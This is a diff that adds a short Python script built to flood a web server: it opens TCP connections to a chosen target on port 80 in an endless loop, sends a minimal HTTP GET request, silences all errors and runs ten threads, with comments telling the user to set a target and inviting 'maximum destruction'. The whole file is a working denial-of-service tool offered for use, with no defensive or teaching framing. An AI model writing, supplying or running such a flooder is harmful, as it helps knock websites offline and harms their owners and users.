@@ -1,0 +1,22 @@
+import socket
+import threading
+
+def ddos(target, port):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.send(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'))
+            s.send(('Host: ' + target + '\r\n\r\n').encode('ascii'))
+            s.close()
+        except:
+            pass
+
+# Set your target and port
+target = 'target_website.com'
+port = 80
+
+# Spawn multiple threads for maximum destruction
+for _ in range(10):
+    thread = threading.Thread(target=ddos, args=(target, port))
+    thread.start()
